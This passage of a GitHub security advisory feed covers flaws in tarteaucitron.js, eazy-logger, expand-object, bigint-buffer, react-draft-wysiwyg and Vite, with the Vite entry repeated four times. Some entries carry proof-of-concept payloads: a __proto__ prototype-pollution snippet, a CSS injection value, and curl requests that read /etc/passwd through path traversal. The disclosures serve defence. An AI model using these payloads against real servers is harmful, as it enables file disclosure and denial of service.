<h2 id="fix-httpsgithubcomamaurictarteaucitronjscommit74c354c413ee3f82dff97a15a0a43942887c2b5b">Fix <a href="https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b">https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b</a></h2>
<p>The issue was resolved by ensuring that user-controlled inputs cannot modify JavaScript object prototypes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-4hwx-xcc5-2hfc">https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-4hwx-xcc5-2hfc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31475">https://nvd.nist.gov/vuln/detail/CVE-2025-31475</a></li>
<li><a href="https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b">https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b</a></li>
<li><a href="https://github.com/advisories/GHSA-4hwx-xcc5-2hfc">https://github.com/advisories/GHSA-4hwx-xcc5-2hfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4hwx-xcc5-2hfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-07T16:38:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tarteaucitronjs] tarteaucitron.js allows UI manipulation via unrestricted CSS injection]]></title>
        <id>https://github.com/advisories/GHSA-7524-3396-fqv3</id>
        <link href="https://github.com/advisories/GHSA-7524-3396-fqv3"/>
        <updated>2025-04-07T16:38:25.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in <code>tarteaucitron.js</code>, where user-controlled inputs for element dimensions (<code>width</code> and <code>height</code>) were not properly validated. This allowed an attacker with direct access to the site's source code or a CMS plugin to set values like <code>100%;height:100%;position:fixed;</code>, potentially covering the entire viewport and facilitating clickjacking attacks.</p>
<h2 id="impact">Impact</h2>
<p>An attacker with high privileges could exploit this vulnerability to:</p>
<ul>
<li>Overlay malicious UI elements on top of legitimate content,</li>
<li>Trick users into interacting with hidden elements (clickjacking),</li>
<li>Disrupt the intended functionality and accessibility of the website.</li>
</ul>
<h2 id="fix-httpsgithubcomamaurictarteaucitronjscommit25fcf828aaa55306ddc09cfbac9a6f8f126e2d07">Fix <a href="https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07">https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07</a></h2>
<p>The issue was resolved by enforcing strict validation and sanitization of user-provided CSS values to prevent unintended UI manipulation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-7524-3396-fqv3">https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-7524-3396-fqv3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31138">https://nvd.nist.gov/vuln/detail/CVE-2025-31138</a></li>
<li><a href="https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07">https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07</a></li>
<li><a href="https://github.com/advisories/GHSA-7524-3396-fqv3">https://github.com/advisories/GHSA-7524-3396-fqv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7524-3396-fqv3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-07T16:38:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[eazy-logger] eazy-logger prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-r7jx-5m6m-cpg9</id>
        <link href="https://github.com/advisories/GHSA-r7jx-5m6m-cpg9"/>
        <updated>2025-04-07T12:34:02.000Z</updated>
        <content type="html"><![CDATA[<p>A prototype pollution in the lib.Logger function of eazy-logger v4.0.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>
<p>An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., <code>child_process.exec</code>, <code>eval</code>), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('eazy-logger');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.Logger (JSON.parse('{"__proto__":{"pollutedKey":123}}'))
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57075">https://nvd.nist.gov/vuln/detail/CVE-2024-57075</a></li>
<li><a href="https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5">https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5</a></li>
<li><a href="https://github.com/shakyShane/eazy-logger/commit/a8baa6fe441d19ffa9916eba367016b7937a28fd">https://github.com/shakyShane/eazy-logger/commit/a8baa6fe441d19ffa9916eba367016b7937a28fd</a></li>
<li><a href="https://github.com/advisories/GHSA-r7jx-5m6m-cpg9">https://github.com/advisories/GHSA-r7jx-5m6m-cpg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7jx-5m6m-cpg9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T06:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[expand-object] expand-object Vulnerable to Prototype Pollution via the expand() Function]]></title>
        <id>https://github.com/advisories/GHSA-4vjr-hfpp-2m7w</id>
        <link href="https://github.com/advisories/GHSA-4vjr-hfpp-2m7w"/>
        <updated>2025-04-04T18:24:06.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package expand-object from 0.0.0 to 0.4.2 are vulnerable to Prototype Pollution in the expand() function in index.js. This function expands the given string into an object and allows a nested property to be set without checking the provided keys for sensitive properties like <strong>proto</strong>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3197">https://nvd.nist.gov/vuln/detail/CVE-2025-3197</a></li>
<li><a href="https://gist.github.com/miguelafmonteiro/d8f66af61d14e06338b688f90c4dfa7c">https://gist.github.com/miguelafmonteiro/d8f66af61d14e06338b688f90c4dfa7c</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-EXPANDOBJECT-5821390">https://security.snyk.io/vuln/SNYK-JS-EXPANDOBJECT-5821390</a></li>
<li><a href="https://github.com/jonschlinkert/expand-object/blob/master/index.js#L13">https://github.com/jonschlinkert/expand-object/blob/master/index.js#L13</a></li>
<li><a href="https://github.com/advisories/GHSA-4vjr-hfpp-2m7w">https://github.com/advisories/GHSA-4vjr-hfpp-2m7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vjr-hfpp-2m7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T06:34:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bigint-buffer] bigint-buffer Vulnerable to Buffer Overflow via toBigIntLE() Function]]></title>
        <id>https://github.com/advisories/GHSA-3gc7-fjrx-p6mg</id>
        <link href="https://github.com/advisories/GHSA-3gc7-fjrx-p6mg"/>
        <updated>2025-04-04T18:23:46.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package bigint-buffer from 0.0.0 to 1.1.5 are vulnerable to Buffer Overflow in the toBigIntLE() function. Attackers can exploit this to crash the application.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3194">https://nvd.nist.gov/vuln/detail/CVE-2025-3194</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-BIGINTBUFFER-3364597">https://security.snyk.io/vuln/SNYK-JS-BIGINTBUFFER-3364597</a></li>
<li><a href="https://www.usenix.org/system/files/sec23fall-prepub-262_staicu.pdf">https://www.usenix.org/system/files/sec23fall-prepub-262_staicu.pdf</a></li>
<li><a href="https://github.com/no2chem/bigint-buffer/blob/master/src/index.ts#L25">https://github.com/no2chem/bigint-buffer/blob/master/src/index.ts#L25</a></li>
<li><a href="https://github.com/advisories/GHSA-3gc7-fjrx-p6mg">https://github.com/advisories/GHSA-3gc7-fjrx-p6mg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3gc7-fjrx-p6mg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-04T06:34:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[react-draft-wysiwyg] React Draft Wysiwyg Cross-Site Scripting (XSS) via the Embedded Button]]></title>
        <id>https://github.com/advisories/GHSA-fq5x-7292-2p5r</id>
        <link href="https://github.com/advisories/GHSA-fq5x-7292-2p5r"/>
        <updated>2025-04-04T18:23:09.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package react-draft-wysiwyg are vulnerable to Cross-site Scripting (XSS) via the Embedded button which will then result in saving the payload in the </p>]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fq5x-7292-2p5r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-04T06:34:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths]]></title>
        <id>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</id>
        <link href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"/>
        <updated>2025-04-04T14:20:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href="https://vitejs.dev/config/server-options.html#server-host">server.host config option</a>) are affected..</p>
<h3 id="details">Details</h3>
<h4 id="svg"><code>.svg</code></h4>
<p>Requests ending with <code>.svg</code> are loaded at this line.
<a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>
By adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>
<p>This bypass is only possible if the file is smaller than <a href="https://vite.dev/config/build-options.html#build-assetsinlinelimit"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>
<h4 id="relative-paths">relative paths</h4>
<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">npm create vite@latest
cd vite-project/
npm install
npm run dev
</code></pre>
<p>send request to read <code>etc/passwd</code></p>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
</code></pre>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31486">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>
<li><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>
<li><a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>
<li><a href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T14:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths]]></title>
        <id>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</id>
        <link href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"/>
        <updated>2025-04-04T14:20:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href="https://vitejs.dev/config/server-options.html#server-host">server.host config option</a>) are affected..</p>
<h3 id="details">Details</h3>
<h4 id="svg"><code>.svg</code></h4>
<p>Requests ending with <code>.svg</code> are loaded at this line.
<a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>
By adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>
<p>This bypass is only possible if the file is smaller than <a href="https://vite.dev/config/build-options.html#build-assetsinlinelimit"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>
<h4 id="relative-paths">relative paths</h4>
<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">npm create vite@latest
cd vite-project/
npm install
npm run dev
</code></pre>
<p>send request to read <code>etc/passwd</code></p>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
</code></pre>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31486">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>
<li><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>
<li><a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>
<li><a href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T14:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths]]></title>
        <id>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</id>
        <link href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"/>
        <updated>2025-04-04T14:20:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href="https://vitejs.dev/config/server-options.html#server-host">server.host config option</a>) are affected..</p>
<h3 id="details">Details</h3>
<h4 id="svg"><code>.svg</code></h4>
<p>Requests ending with <code>.svg</code> are loaded at this line.
<a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>
By adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>
<p>This bypass is only possible if the file is smaller than <a href="https://vite.dev/config/build-options.html#build-assetsinlinelimit"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>
<h4 id="relative-paths">relative paths</h4>
<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">npm create vite@latest
cd vite-project/
npm install
npm run dev
</code></pre>
<p>send request to read <code>etc/passwd</code></p>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
</code></pre>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31486">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>
<li><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>
<li><a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>
<li><a href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T14:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths]]></title>
        <id>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</id>
        <link href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"/>
        <updated>2025-04-04T14:20:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href="https://vitejs.dev/config/server-options.html#server-host">server.host config option</a>) are affected..</p>
<h3 id="details">Details</h3>
<h4 id="svg"><code>.svg</code></h4>
<p>Requests ending with <code>.svg</code> are loaded at this line.
<a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>
By adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>
<p>This bypass is only possible if the file is smaller than <a href="https://vite.dev/config/build-options.html#build-assetsinlinelimit"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>
<h4 id="relative-paths">relative paths</h4>
<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">npm create vite@latest
cd vite-project/
npm install
npm run dev
</code></pre>
<p>send request to read <code>etc/passwd</code></p>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
</code></pre>
<pre><code class="language-bash">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31486">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>
<li><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>
<li><a href="https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>
<li><a href="https://github.com/advisories/GHSA-xcj6-pq6g-qj4x">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-04T14:20:05.000Z</published>
    </entry>
</feed>